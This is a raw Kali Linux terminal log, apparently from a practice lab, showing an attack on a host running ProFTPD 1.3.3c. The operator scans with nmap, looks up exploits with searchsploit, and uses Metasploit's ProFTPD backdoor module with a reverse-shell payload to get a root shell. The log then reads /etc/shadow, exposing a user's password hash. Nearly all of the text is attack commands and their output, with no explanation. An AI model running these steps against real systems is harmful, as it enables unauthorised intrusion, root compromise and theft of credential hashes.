                                                                                                                                                                         ```                   
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -vv 192.168.178.129     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 07:44 EST
NSE: Loaded 45 scripts for scanning.
Initiating ARP Ping Scan at 07:44
Scanning 192.168.178.129 [1 port]
Completed ARP Ping Scan at 07:44, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:44
Completed Parallel DNS resolution of 1 host. at 07:44, 0.02s elapsed
Initiating SYN Stealth Scan at 07:44
Scanning 192.168.178.129 [1000 ports]
Discovered open port 22/tcp on 192.168.178.129
Discovered open port 21/tcp on 192.168.178.129
Discovered open port 80/tcp on 192.168.178.129
Completed SYN Stealth Scan at 07:44, 0.23s elapsed (1000 total ports)
Initiating Service scan at 07:44
Scanning 3 services on 192.168.178.129
Completed Service scan at 07:44, 6.05s elapsed (3 services on 1 host)
NSE: Script scanning 192.168.178.129.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 07:44
Completed NSE at 07:44, 0.06s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 07:44
Completed NSE at 07:44, 0.00s elapsed
Nmap scan report for 192.168.178.129
Host is up, received arp-response (0.00037s latency).
Scanned at 2023-02-22 07:44:34 EST for 7s
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 ProFTPD 1.3.3c
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 00:0C:29:D2:5B:04 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.32 seconds
           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.040KB)
                                                                                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ searchsploit ProFTPD 1.3.3c      
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution                                                                                          | linux/remote/15662.txt
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)                                                                                                    | linux/remote/16921.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole -q               
msf6 > 
msf6 > search ProFTPD 1.3.3c
 
Matching Modules
================

   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/unix/ftp/proftpd_133c_backdoor  2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/proftpd_133c_backdoor

msf6 >  use 0
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show options 

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show payloads 

Compatible Payloads
===================

   #  Name                                        Disclosure Date  Rank    Check  Description
   -  ----                                        ---------------  ----    -----  -----------
   0  payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
   1  payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   2  payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
   3  payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   4  payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   5  payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   6  payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   7  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)

msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show options 

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 192.168.178.129
RHOSTS => 192.168.178.129
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RPORT 21
RPORT => 21
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > ifconfig
[*] exec: ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.178.130  netmask 255.255.255.0  broadcast 192.168.178.255
        inet6 fe80::e648:534a:ecad:ec50  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:68:6e:c4  txqueuelen 1000  (Ethernet)
        RX packets 1533  bytes 98412 (96.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1617  bytes 101468 (99.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 24  bytes 1440 (1.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24  bytes 1440 (1.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LHOST 192.168.178.130 
LHOST => 192.168.178.130
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LPORT 4455
LPORT => 4455
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show options 

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.178.129  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.178.130  yes       The listen address (an interface may be specified)
   LPORT  4455             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/proftpd_133c_backdoor) > exploit

[*] Started reverse TCP double handler on 192.168.178.130:4455 
[*] 192.168.178.129:21 - Sending Backdoor Command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo bqKzlXW2Zm4A8n8i;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "bqKzlXW2Zm4A8n8i\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.178.130:4455 -> 192.168.178.129:50534) at 2023-02-22 08:11:26 -0500

id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
whoami
root

cd /home
ls
marlinspike
 
python -c 'import os; os.system("/bin/sh")' 

shell
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash


root@vtcsec:/home# ls
ls
marlinspike
root@vtcsec:/home# cd 
cd 
bash: cd: HOME not set
root@vtcsec:/home# c   
c
c: command not found
root@vtcsec:/home# 

root@vtcsec:/home# cd /root
cd /root
root@vtcsec:/root# ls
ls
root@vtcsec:/root# cd ..
cd ..
root@vtcsec:/# ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys   var
root@vtcsec:/# cd etc
cd etc
root@vtcsec:/etc# ls
ls
acpi                           hostname                 ppp
adduser.conf                   hosts                    printcap
alternatives                   hosts.allow              profile
anacrontab                     hosts.deny               profile.d
apache2                        hp                       protocols
apg.conf                       ifplugd                  pulse
apm                            iftab                    python
apparmor                       ImageMagick-6            python2.7
apparmor.d                     init                     python3
apport                         init.d                   python3.5
appstream.conf                 initramfs-tools          rc0.d
apt                            inputrc                  rc1.d
aptdaemon                      insserv                  rc2.d
at-spi2                        insserv.conf             rc3.d
avahi                          insserv.conf.d           rc4.d
bash.bashrc                    iproute2                 rc5.d
bash_completion                issue                    rc6.d
bash_completion.d              issue.net                rc.local
bindresvport.blacklist         kbd                      rcS.d
binfmt.d                       kernel                   resolvconf
bluetooth                      kernel-img.conf          resolv.conf
brlapi.key                     kerneloops.conf          rmt
brltty                         ldap                     rpc
brltty.conf                    ld.so.cache              rsyslog.conf
ca-certificates                ld.so.conf               rsyslog.d
ca-certificates.conf           ld.so.conf.d             sane.d
ca-certificates.conf.dpkg-old  legal                    securetty
calendar                       libao.conf               security
chatscripts                    libaudit.conf            selinux
compizconfig                   libnl-3                  sensors3.conf
console-setup                  libpaper.d               sensors.d
cracklib                       libreoffice              services
cron.d                         lightdm                  sgml
cron.daily                     lintianrc                shadow
cron.hourly                    locale.alias             shadow-
cron.monthly                   locale.gen               shells
crontab                        localtime                signond.conf
cron.weekly                    logcheck                 signon-ui
cups                           login.defs               skel
cupshelpers                    logrotate.conf           speech-dispatcher
dbus-1                         logrotate.d              ssh
dconf                          lsb-release              ssl
debconf.conf                   ltrace.conf              subgid
debian_version                 machine-id               subgid-
default                        magic                    subuid
deluser.conf                   magic.mime               subuid-
depmod.d                       mailcap                  sudoers
dhcp                           mailcap.order            sudoers.d
dictionaries-common            manpath.config           sysctl.conf
dnsmasq.d                      mime.types               sysctl.d
doc-base                       mke2fs.conf              systemd
dpkg                           modprobe.d               terminfo
drirc                          modules                  thermald
emacs                          modules-load.d           thunderbird
environment                    mtab                     timezone
firefox                        mtools.conf              tmpfiles.d
fonts                          mysql                    ucf.conf
fstab                          nanorc                   udev
fuse.conf                      network                  udisks2
fwupd.conf                     NetworkManager           ufw
gai.conf                       networks                 updatedb.conf
gconf                          newt                     update-manager
gdb                            nsswitch.conf            update-motd.d
ghostscript                    opt                      update-notifier
gnome                          os-release               UPower
gnome-app-install              pam.conf                 upstart-xsessions
groff                          pam.d                    usb_modeswitch.conf
group                          papersize                usb_modeswitch.d
group-                         passwd                   vim
grub.d                         passwd-                  vtrgb
gshadow                        pcmcia                   wgetrc
gshadow-                       perl                     wpa_supplicant
gss                            php                      X11
gtk-2.0                        pki                      xdg
gtk-3.0                        pm                       xml
guest-session                  pnm2ppa.conf             zsh_command_not_found
hdparm.conf                    polkit-1
host.conf                      popularity-contest.conf
root@vtcsec:/etc#  

root@vtcsec:/etc# cat shadow
cat shadow
root:!:17484:0:99999:7:::
daemon:*:17379:0:99999:7:::
bin:*:17379:0:99999:7:::
sys:*:17379:0:99999:7:::
sync:*:17379:0:99999:7:::
games:*:17379:0:99999:7:::
man:*:17379:0:99999:7:::
lp:*:17379:0:99999:7:::
mail:*:17379:0:99999:7:::
news:*:17379:0:99999:7:::
uucp:*:17379:0:99999:7:::
proxy:*:17379:0:99999:7:::
www-data:*:17379:0:99999:7:::
backup:*:17379:0:99999:7:::
list:*:17379:0:99999:7:::
irc:*:17379:0:99999:7:::
gnats:*:17379:0:99999:7:::
nobody:*:17379:0:99999:7:::
systemd-timesync:*:17379:0:99999:7:::
systemd-network:*:17379:0:99999:7:::
systemd-resolve:*:17379:0:99999:7:::
systemd-bus-proxy:*:17379:0:99999:7:::
syslog:*:17379:0:99999:7:::
_apt:*:17379:0:99999:7:::
messagebus:*:17379:0:99999:7:::
uuidd:*:17379:0:99999:7:::
lightdm:*:17379:0:99999:7:::
whoopsie:*:17379:0:99999:7:::
avahi-autoipd:*:17379:0:99999:7:::
avahi:*:17379:0:99999:7:::
dnsmasq:*:17379:0:99999:7:::
colord:*:17379:0:99999:7:::
speech-dispatcher:!:17379:0:99999:7:::
hplip:*:17379:0:99999:7:::
kernoops:*:17379:0:99999:7:::
pulse:*:17379:0:99999:7:::
rtkit:*:17379:0:99999:7:::
saned:*:17379:0:99999:7:::
usbmux:*:17379:0:99999:7:::
marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::
mysql:!:17486:0:99999:7:::
sshd:*:17486:0:99999:7:::
root@vtcsec:/etc# 
```
